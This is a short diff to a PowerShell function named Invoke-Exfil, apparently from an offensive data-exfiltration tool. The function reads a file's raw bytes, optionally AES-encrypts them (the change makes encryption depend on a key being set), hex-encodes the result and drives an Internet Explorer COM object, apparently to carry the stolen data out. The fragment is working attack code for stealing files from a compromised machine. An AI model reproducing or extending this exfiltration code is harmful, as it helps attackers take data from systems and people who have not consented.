@@ -48,7 +48,9 @@ function Invoke-Exfil {
     $hash = $hash -replace '-','';
     $IE = new-object -com internetexplorer.application;
     $data = [System.IO.File]::ReadAllBytes($file);
-    $data = AES $data
+    If ($key) {
+        $data = AES $data 
+    }
     $string = [System.BitConverter]::ToString($data);
     $string = $string -replace '-','';
     $filename = Split-Path $file -leaf
